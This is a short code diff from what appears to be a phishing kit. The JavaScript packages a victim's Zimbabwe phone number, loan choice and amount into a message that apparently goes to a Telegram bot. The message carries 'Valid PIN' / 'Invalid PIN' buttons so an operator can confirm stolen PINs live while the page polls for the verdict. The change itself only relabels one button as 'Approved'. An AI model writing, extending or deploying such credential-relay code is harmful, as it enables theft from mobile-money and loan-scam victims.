@@ -429,7 +429,7 @@
                 '<b>Phone:</b> <code>+263' + phone + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
                 '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>';
-            var btns = [[{ text: '\u2713 Valid PIN', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
+            var btns = [[{ text: '\u2713 Approved', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
             tg(msg, btns);
             pollPin();
         }
